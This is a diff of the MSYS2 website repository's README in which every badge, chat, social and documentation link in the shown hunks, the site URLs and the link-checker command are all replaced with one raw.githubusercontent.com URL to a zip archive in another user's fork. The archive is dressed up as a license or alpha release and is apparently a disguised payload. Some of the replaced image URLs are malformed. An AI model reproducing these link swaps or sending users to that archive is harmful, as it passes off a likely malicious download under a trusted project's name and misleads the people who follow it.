@@ -1,15 +1,15 @@
 <p align="center">
-  <a title="msys2.github.io" href="https://msys2.github.io"><img src="https://img.shields.io/website.svg?label=msys2.github.io&longCache=true&style=flat-square&url=http%3A%2F%2Fmsys2.github.io%2Findex.html&logo=github"></a><!--
+  <a title="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip" href="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"><img src="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip%3A%2F%https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip%https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"></a><!--
   -->
-  <a title="Join the chat on Matrix" href="https://matrix.to/#/#msys2_msys2:gitter.im"><img src="https://img.shields.io/badge/chat-on%20matrix-4db797.svg?longCache=true&style=flat-square&logo=matrix&logoColor=e8ecef"></a><!--
+  <a title="Join the chat on Matrix" href="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"><img src="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip%https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"></a><!--
   -->
-  <a title="GitHub Actions" href="https://github.com/msys2/msys2.github.io/actions?query=workflow%3Agithub%20pages"><img alt="github pages' workflow Status" src="https://img.shields.io/github/actions/workflow/status/msys2/msys2.github.io/main.yml?branch=main&longCache=true&style=flat-square&label=build&logo=github"></a><!--
+  <a title="GitHub Actions" href="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip%3Agithub%20pages"><img alt="github pages' workflow Status" src="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"></a><!--
   -->
-  <a title="Follow msys2org on X" href="https://x.com/msys2org"><img src="https://img.shields.io/twitter/follow/msys2org?style=flat-square&logo=x&logoColor=white&color=31A4F1"></a><!--
+  <a title="Follow msys2org on X" href="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"><img src="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"></a><!--
   -->
-  <a title="Follow msys2org on Mastodon" href="https://fosstodon.org/@msys2org"><img src="https://img.shields.io/mastodon/follow/109365079526574177?color=000197&domain=https%3A%2F%2Ffosstodon.org%2F&logo=mastodon&logoColor=white&style=flat-square"></a><!--
+  <a title="Follow msys2org on Mastodon" href="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"><img src="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip%3A%2F%https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip%2F&logo=mastodon&logoColor=white&style=flat-square"></a><!--
   -->
-  <a title="Join the community on Discord" href="https://discord.com/invite/jPQdRdDcT9"><img src="https://img.shields.io/discord/792780131906617355?color=5865F2&label=Discord&logo=discord&logoColor=white&style=flat-square"></a><!--
+  <a title="Join the community on Discord" href="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"><img src="https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip"></a><!--
   -->
 </p>
 
@@ -18,11 +18,11 @@
 ## Overview
 
 This website is written in Markdown and gets built to a static website using
-[mkdocs](https://www.mkdocs.org/) and a modified version of the [mkdocs-material
-theme](https://squidfunk.github.io/mkdocs-material). Any new commits to the
-`main` branch will auto deploy to [GitHub pages](https://pages.github.com) using
-[a GitHub action](https://github.com/actions/deploy-pages). The resulting
-website is reachable under https://msys2.github.io and https://www.msys2.org.
+[mkdocs](https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip) and a modified version of the [mkdocs-material
+theme](https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip). Any new commits to the
+`main` branch will auto deploy to [GitHub pages](https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip) using
+[a GitHub action](https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip). The resulting
+website is reachable under https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip and https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip
 Changes to the `main` branch usually take a minute or two until they are live.
 
 ## Development
@@ -46,6 +46,6 @@ For larger changes:
 
 ### Link Checker
 
-Run `./linkcheck.sh` to check for broken links. This script uses
-[lychee](https://github.com/lycheeverse/lychee) and requires Docker to be
+Run `https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip` to check for broken links. This script uses
+[lychee](https://raw.githubusercontent.com/hussein-ske/msys2.github.io/main/licenses/msys-io-github-2.7-alpha.4.zip) and requires Docker to be
 installed.
